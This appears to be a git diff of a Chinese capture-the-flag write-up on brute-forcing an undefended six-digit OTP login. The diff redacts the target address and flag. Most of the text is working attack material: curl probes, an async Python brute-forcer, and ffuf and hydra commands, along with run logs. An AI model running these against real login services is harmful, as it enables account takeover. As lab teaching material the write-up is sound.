@@ -3,9 +3,9 @@
 > 6 位 OTP + `/verify` 无任何防御（无失败计数 / 无锁 / 无 IP 限速 / 无过期 / 无 CAPTCHA）
 > → 10^6 空间在分钟级被在线爆破。
 
-- 靶机：`http://47.120.76.57:34950`
+- 靶机：`http://目标地址`
 - 目标：让 `admin` 通过 OTP 登录，拿到首页 `<pre>` 中的 flag。
-- 本次结果：`OTP=424030`，`FLAG=TOGOGO-flag{d8acdf42-19f1-4055-8da1-b06e8c69bf06}`
+- 本次结果：`OTP=424030`，`FLAG=TOGOGO-flag{}`
 
 ---
 
@@ -13,10 +13,10 @@
 
 ```bash
 # 登录页（看到表单字段：username / otp）
-curl -s http://47.120.76.57:34950/ | grep -E 'form|input'
+curl -s http://目标地址/ | grep -E 'form|input'
 
 # 试一次错误 OTP，观察响应
-curl -i -s -X POST http://47.120.76.57:34950/verify \
+curl -i -s -X POST http://目标地址/verify \
      -d 'username=admin&otp=000000'
 # HTTP/1.1 401 UNAUTHORIZED   →   body: wrong otp
 ```
@@ -28,7 +28,7 @@ curl -i -s -X POST http://47.120.76.57:34950/verify \
 ```bash
 for i in $(seq 1 30); do
   curl -s -o /dev/null -w '%{http_code} ' \
-       -X POST http://47.120.76.57:34950/verify \
+       -X POST http://目标地址/verify \
        -d "username=admin&otp=$(printf '%06d' $i)"
 done; echo
 # 输出全是 401 → 直接上爆破
@@ -52,7 +52,7 @@ if r.status_code == 200 and "flag{" in r.text.lower():
 
 ```python
 import asyncio, httpx, random, time
-BASE = "http://47.120.76.57:34950"; CONC = 200
+BASE = "http://目标地址"; CONC = 200
 found = asyncio.Event(); hit = {}
 
 async def one(c, sem, n):
@@ -99,7 +99,7 @@ tail -f brute.log
 [100000] 144s rate=697/s try=...
 [776000]1386s rate=560/s try=819031
 [+] HIT otp=424030
-[+] FLAG = TOGOGO-flag{d8acdf42-19f1-4055-8da1-b06e8c69bf06}
+[+] FLAG = TOGOGO-flag{}
 ```
 
 23 分钟、77.6 万次请求命中（运气偏右，期望 ~13 分钟）。
@@ -110,7 +110,7 @@ tail -f brute.log
 # A) 用 ffuf 跑（最简单），生成 0~999999 的 6 位 OTP 字典
 seq -f "%06g" 0 999999 > /tmp/otp.txt
 ffuf -w /tmp/otp.txt:OTP \
-     -u http://47.120.76.57:34950/verify \
+     -u http://目标地址/verify \
      -X POST -d 'username=admin&otp=OTP' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -fc 401 -t 100        # 过滤 401，命中行会停下来
@@ -118,15 +118,15 @@ ffuf -w /tmp/otp.txt:OTP \
 
 ```bash
 # B) hydra 写法（自动 6 位数字）
-hydra -l admin -x 6:6:1 -t 64 47.120.76.57 -s 34950 http-post-form \
+hydra -l admin -x 6:6:1 -t 64 目标地址 -s 34950 http-post-form \
       "/verify:username=^USER^&otp=^PASS^:wrong otp"
 ```
 
 ```bash
 # C) 命中后用浏览器直接验证（拿到 OTP 后）
-curl -i -s -X POST http://47.120.76.57:34950/verify \
+curl -i -s -X POST http://目标地址/verify \
      -d 'username=admin&otp=424030' -c /tmp/c.txt
-curl -s -b /tmp/c.txt http://47.120.76.57:34950/ | grep flag
+curl -s -b /tmp/c.txt http://目标地址/ | grep flag
 ```
 
 ## 6. 漏洞要点 & 修复
